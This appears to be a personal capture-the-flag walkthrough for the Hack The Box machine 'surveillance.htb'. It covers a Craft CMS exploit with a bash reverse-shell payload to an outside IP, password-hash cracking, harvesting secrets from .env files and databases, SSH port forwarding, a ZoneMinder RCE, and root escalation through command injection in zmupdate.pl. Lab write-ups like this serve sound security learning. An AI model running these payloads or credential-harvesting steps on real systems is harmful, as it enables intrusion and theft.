# surveillance-reference
Host: surveillance.htb

Found admin page at: /admin/login

Uses Craft CMS (maybe vulns can be found)

There appears to be some sort of CLI that I can use to interact with the server

Exploit found from https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226

Payload: `//bin/bash -c 'bash -i >& /dev/tcp/10.10.14.99/4444 0>&1'`

by reading the etc/hosts file we find a username matthew, which is likely our ssh login name

Now, by sifting through the database file, which i extracted beforehand, we find this interesting tidbit:
```
INSERT INTO `users` VALUES (1,NULL,1,0,0,0,1,'admin','Matthew B','Matthew','B','admin@surveillance.htb','39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec','2023-10-17 20:22:34',NULL,NULL,NULL,'2023-10-11 18:58:57',NULL,1,NULL,NULL,NULL,0,'2023-10-17 20:27:46','2023-10-11 17:57:16','2023-10-17 20:27:46');
```

So I can assume that that random set of numbers is the password of our ssh login. So let's try n crack it.
After popping it into crackstation.net, we get that this password is: starcraft122490

So let's try and log in to ssh.

So by a little bit of trial and error, we arrive at the following ssh credentials:
login: matthew@surveillance.htb
password: starcraft122490

Interesting Tidbit:
```
-rw-r--r-- 1 root root 0 May  2  2023 /usr/lib/node_modules/passbolt_cli/node_modules/psl/.env
-rw-r--r-- 1 www-data www-data 836 Oct 21 18:32 /var/www/html/craft/.env
CRAFT_APP_ID=CraftCMS--070c5b0b-ee27-4e50-acdf-0436a93ca4c7
CRAFT_ENVIRONMENT=production
CRAFT_SECURITY_KEY=2HfILL3OAEe5X0jzYOVY5i7uUizKmB2_
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=craftdb
CRAFT_DB_USER=craftuser
CRAFT_DB_PASSWORD=CraftCMSPassword2023!
CRAFT_DB_SCHEMA=
CRAFT_DB_TABLE_PREFIX=
DEV_MODE=false
ALLOW_ADMIN_CHANGES=false
DISALLOW_ROBOTS=false
PRIMARY_SITE_URL=http://surveillance.htb/
```


Maybe crafty is running with root privileges, maybe if we log in to the admin page, we can run commands as root 

By using the command

`mysql -u craftuser -p`

and then entering the password
We can connect to MariaDB from which there is a users table from which I use the command
select username,email,password from users;

to select the username, email and password of the users table.
We get the following data
username: admin
email: admin@surveillance.htb
password: $2y$13$FoVGcLXXNe81B6x9bKry9OzGSSIYL7/ObcmQ0CXtgw.EpuNcx8tGe

This is obviously encrypted so let's decrypt it.
For this we'll use john

Now, the decrpytion will end only when I grow old and die.
So instead, we use another interesting tidbit we find.

In the hosts file, we can see that there is another service (zoneminder) which is running on port 8080.
We are, however, unable to connect to this port.

So, we will forward port 2222 on our machine to port 8080 of surveillance.htb
Command:
`ssh -L 2222:127.0.0.1:8080 matthew@surveillance.htb`

This will allow us to access the machine through port 2222: `http://127.0.0.1:2222`

Found an unauthenticated RCE exploit on:
https://github.com/rvizx/CVE-2023-26035

After stabilizing the obtained reverse shell I examined the linpeas analysis on matthew and found this interesting tidbit
```
-rw-r--r-- 1 root zoneminder 5265 Nov 18  2022 /usr/share/zoneminder/www/ajax/modals/storage.php
-rw-r--r-- 1 root zoneminder 1249 Nov 18  2022 /usr/share/zoneminder/www/includes/actions/storage.php

-rw-r--r-- 1 root zoneminder 3503 Oct 17 11:32 /usr/share/zoneminder/www/api/app/Config/database.php
		'password' => ZM_DB_PASS,
		'database' => ZM_DB_NAME,
		'host' => 'localhost',
		'password' => 'ZoneMinderPassword2023',
		'database' => 'zm',
				$this->default['host'] = $array[0];
			$this->default['host'] = ZM_DB_HOST;
-rw-r--r-- 1 root zoneminder 11257 Nov 18  2022 /usr/share/zoneminder/www/includes/database.php
```

This means that we can login to the ZoneMinder database, and mostly find the password to the zoneminder user there.

I am doing this because I found that the zoneminder user can run all .pl files as sudo. So we can just do sudo su to become root.

Now I didnt do most of this bit by myself, so.... well, I'll just write the steps in my own words.

So, it turns out that a certain file called zmupdate.pl is actually vulnerable to some command injection, which can be found out through some sophisticated googling. Since zoneminder is running as root on the computer, it will return a root shell that we can exploit.
So, by running this command and then stabilizing the shell, we can become root.
``` bash
sudo /usr/bin/zmupdate.pl --version=1 --user='$(/bin/bash -i)' --pass=ZoneMinderPassword2023
```
I think there are other ways to privilege escalate but I'm not sure how, I assume we can google each file and find that it's vulneable.
